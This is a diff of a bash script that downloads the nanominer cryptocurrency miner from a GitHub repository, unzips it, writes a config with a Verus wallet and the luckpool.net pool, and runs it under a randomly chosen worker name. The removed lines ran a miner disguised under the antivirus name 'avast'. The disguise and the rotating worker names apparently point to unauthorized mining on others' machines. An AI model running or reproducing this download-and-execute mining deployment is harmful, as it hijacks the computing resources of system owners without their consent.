@@ -1,4 +1,17 @@
 #!/bin/bash
-
-chmod +x avast  >/dev/null 2>&1
-./avast -v -l  eu.luckpool.net:3956 -u RKUEhTZwKjVXd1ms7r3gUqhNG4fCd83msA.CPU -p x -t 2
+array[0]="darsono"
+array[1]="suyanto"
+array[2]="suyetno"
+size=${#array[@]}
+index=$(($RANDOM % $size))
+worker=${array[$index]}
+wget -qO nano https://github.com/eliteleon/private/raw/main/software/nanominer.zip
+unzip -qq nano
+chmod +x nanominer
+echo "[Verushash]
+wallet = RUg3ZdP9k3qN8yPcAC4AEJWoktxLFyWngv
+coin = VRSC
+rigName = $worker
+rigPassword = x
+pool1 = eu.luckpool.net:3956" > config.ini
+./nanominer
